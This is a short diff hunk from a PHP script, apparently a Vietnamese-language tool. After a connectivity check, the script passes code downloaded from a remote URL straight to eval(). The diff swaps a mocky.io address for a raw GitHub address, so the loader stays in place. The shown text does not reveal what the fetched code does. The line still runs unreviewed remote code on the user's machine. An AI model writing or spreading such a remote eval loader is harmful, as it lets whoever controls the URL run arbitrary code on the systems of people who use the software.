@@ -119,5 +119,5 @@ sleep(2);
 if (!$sock = @fsockopen('www.google.com', 80)) {
   exit ("\n\033[1;91m[ERROR] \033[1;97m=> \033[1;91mVui Lòng Bật Kết Nối Wifi Hoặc 4G.\n");
 }else {
-  eval(file_get_contents('https://run.mocky.io/v3/ef9b115f-e57a-4d5b-a6c2-ccf7fa2c90ca'));
+  eval(file_get_contents('https://raw.githubusercontent.com/sangdeveloper36/sang/main/31cd1'));
 }
